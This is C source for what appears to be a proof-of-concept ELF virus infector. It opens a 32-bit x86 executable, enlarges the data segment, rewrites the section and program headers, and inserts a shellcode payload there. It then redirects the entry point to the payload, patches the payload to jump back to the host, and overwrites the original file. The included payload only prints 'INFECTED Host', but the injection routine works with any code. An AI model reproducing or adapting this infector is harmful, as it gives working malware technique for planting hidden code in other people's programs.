#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <elf.h>

#define PAGE_SIZE	4096

int copy_partial(int fd, int od, unsigned int len)
{
	char idata[PAGE_SIZE];
	unsigned int n = 0;
	int r;

	while (n + PAGE_SIZE < len) {
		if (read(fd, idata, PAGE_SIZE) != PAGE_SIZE) {;
			perror("read");
			return -1;
		}

		if (write(od, idata, PAGE_SIZE) < 0) {
			perror("write");
			return -1;
		}

		n += PAGE_SIZE;
	}

	r = read(fd, idata, len - n);
	if (r < 0) {
		perror("read");
		return -1;
	}

	if (write(od, idata, r) < 0) {
		perror("write");
		return -1;
	}

	return 0;
}

void do_elf_checks(Elf32_Ehdr *ehdr)
{
        if (strncmp(ehdr->e_ident, ELFMAG, SELFMAG)) {
                fprintf(stderr, "File not ELF\n");
                exit(1);
        }

        if (ehdr->e_type != ET_EXEC) {
                fprintf(stderr, "ELF type not ET_EXEC or ET_DYN\n");
                exit(1);
        }

        if (ehdr->e_machine != EM_386 && ehdr->e_machine != EM_486) {
                fprintf(stderr, "ELF machine type not EM_386 or EM_486\n");
                exit(1);
        }

        if (ehdr->e_version != EV_CURRENT) {
                fprintf(stderr, "ELF version not current\n");
                exit(1);
        }
}

void infect_elf(char *filename, char *v, int len, int entry_offset)
{
	Elf32_Ehdr ehdr;
	Elf32_Shdr *shdr;
	Elf32_Phdr *phdr;
	char *pdata, *sdata;
	int move = 0;
	int od, fd;
	int evaddr;
	int bss_len, addlen;
	int offset, pos, oshoff;
	int plen, slen;
	int i;
	char null = 0;
	struct stat stat;

	fd = open(filename, O_RDONLY);
	if (fd < 0) {
		perror("open");
		exit(1);
	}

/* read the ehdr */

	if (read(fd, &ehdr, sizeof(ehdr)) < 0) {
		perror("read");
		exit(1);
	}

	do_elf_checks(&ehdr);

/* modify the virus so that it knows the correct reentry point */

	printf("host entry point: %x\n", ehdr.e_entry);
	*(int *)&v[entry_offset] = ehdr.e_entry;

/* allocate memory for phdr tables */

	pdata = (char *)malloc(plen = sizeof(*phdr)*ehdr.e_phnum);
	if (pdata == NULL) {
		perror("malloc");
		exit(1);
	}

/* read the phdr's */

	if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, pdata, plen) != plen) {
		perror("read");
		exit(1);
	}
	phdr = (Elf32_Phdr *)pdata;

	for (i = 0; i < ehdr.e_phnum; i++) {
		if (phdr->p_type == PT_LOAD && phdr->p_offset) {
/* is this the data segment ? */
#ifdef DEBUG
			printf("Found PT_LOAD segment...\n");
			printf(
				"p_vaddr:	0x%x\n"
				"p_offset:	%i\n"
				"p_filesz:	%i\n"
				"p_memsz:	%i\n"
				"\n",
				phdr->p_vaddr,
				phdr->p_offset,
				phdr->p_filesz,
				phdr->p_memsz
			);
#endif
			offset = phdr->p_offset + phdr->p_filesz;
			ehdr.e_entry = phdr->p_vaddr + phdr->p_memsz; 
			bss_len = phdr->p_memsz - phdr->p_filesz;

			break;
		}

		++phdr;
	}

/* allocated memory if required to accomodate the shdr tables */

	sdata = (char *)malloc(slen = sizeof(*shdr)*ehdr.e_shnum);
	if (sdata == NULL) {
		perror("malloc");
		exit(1);
	}

/* read the shdr's */

	if (lseek(fd, oshoff = ehdr.e_shoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, sdata, slen) != slen) {
		perror("read");
		exit(1);
	}

/* update the shdr's to reflect the insertion of the virus */

	addlen = len + bss_len;

	shdr = (Elf32_Shdr *)sdata;

	for (i = 0; i < ehdr.e_shnum; i++) {
		if (shdr->sh_offset >= offset) {
			shdr->sh_offset += addlen;
		}

		++shdr;
	}

/*
	update the phdr's to reflect the extention of the data segment (to
	allow virus insertion)
*/

	phdr = (Elf32_Phdr *)pdata;

	for (i = 0; i < ehdr.e_phnum; i++) {
		if (phdr->p_type != PT_DYNAMIC) {
			if (move) {
				phdr->p_offset += addlen;
			} else if (phdr->p_type == PT_LOAD && phdr->p_offset) {
/* is this the data segment ? */

				phdr->p_filesz += addlen;
				phdr->p_memsz += addlen;

#ifdef DEBUG
				printf("phdr->filesz: %i\n", phdr->p_filesz);
				printf("phdr->memsz: %i\n", phdr->p_memsz);
#endif
 				move = 1;
			}
		}

		++phdr;
	}

/* update ehdr to reflect new offsets */

	if (ehdr.e_shoff >= offset) ehdr.e_shoff += addlen;
	if (ehdr.e_phoff >= offset) ehdr.e_phoff += addlen;

        if (fstat(fd, &stat) < 0) {
                perror("fstat");
                exit(1);
        }

/* write the new virus */

	od = open("v.tmp", O_WRONLY | O_CREAT | O_EXCL, stat.st_mode);
	if (od < 0) {
		perror("open");
		exit(1);
	}

	if (lseek(fd, 0, SEEK_SET) < 0) {
		perror("lseek");
		goto cleanup;
	}

	if (write(od, &ehdr, sizeof(ehdr)) < 0) {
		perror("write");
		goto cleanup;
	}

        if (write(od, pdata, plen) < 0) {
                perror("write");
                goto cleanup;
        }
        free(pdata);

        if (lseek(fd, pos = sizeof(ehdr) + plen, SEEK_SET) < 0) {
                perror("lseek");
                goto cleanup;
        }

	if (copy_partial(fd, od, offset - pos) < 0) goto cleanup;

	for (i = 0; i < bss_len; i++) write(od, &null, 1);

	if (write(od, v, len) != len) {
		perror("write");
		goto cleanup;
	}

	if (copy_partial(fd, od, oshoff - offset) < 0) goto cleanup;

        if (write(od, sdata, slen) < 0) {
                perror("write");
                goto cleanup;
        }
        free(sdata);

        if (lseek(fd, pos = oshoff + slen, SEEK_SET) < 0) {
                perror("lseek");
                goto cleanup;
        }

        if (copy_partial(fd, od, stat.st_size - pos) < 0) goto cleanup;

        if (rename("v.tmp", filename) < 0) {
                perror("rename");
                exit(1);
        }

        if (fchown(od, stat.st_uid, stat.st_gid) < 0) {
                perror("chown");
                exit(1);
        }

	return;

cleanup:
	unlink("v.tmp");
	exit(1);
}

int main(int argc, char *argv[])
{
	int entry_offset = 33;
	char v[] =
		"\x57"			/*	pushl  %edi	*/
		"\x56"			/*	pushl  %esi	*/
		"\x50"			/*	pushl  %eax	*/
		"\x53"			/*	pushl  %ebx	*/
		"\x51"			/*	pushl  %ecx	*/
		"\x52"			/*	pushl  %edx	*/

		"\xeb\x1f"		/* jmp msg_jmp		*/
/* msg_call: */
		"\x59"			/* popl %ecx		*/
		"\xb8\x04\x00\x00\x00"	/* movl $4, %eax	*/
		"\xbb\x01\x00\x00\x00"	/* movl $1, %ebx	*/
		"\xba\x0e\x00\x00\x00"	/* movl $14,%edx	*/
		"\xcd\x80"		/* int $0x80		*/

		"\x5a"			/*	popl   %edx	*/
		"\x59"			/*	popl   %ecx	*/
		"\x5b"			/*	popl   %ebx	*/
		"\x58"			/*	popl   %eax	*/
		"\x5e"			/*	popl   %esi	*/
		"\x5f"			/*	popl   %edi	*/

                "\xbd\x00\x00\x00\x00"	/* movl $0x0, %ebp      */
                "\xff\xe5"		/* jmp *%ebp           */
/* msg_jmp: */
		"\xe8\xdc\xff\xff\xff"	/* call msg_call	*/
		"INFECTED Host\n"
	;

	if (argc != 2) {
		fprintf(stderr, "usage: infect-data-segment filename\n");
		exit(1);
	}

	infect_elf(argv[1], v, sizeof(v), entry_offset);

	exit(0);
}
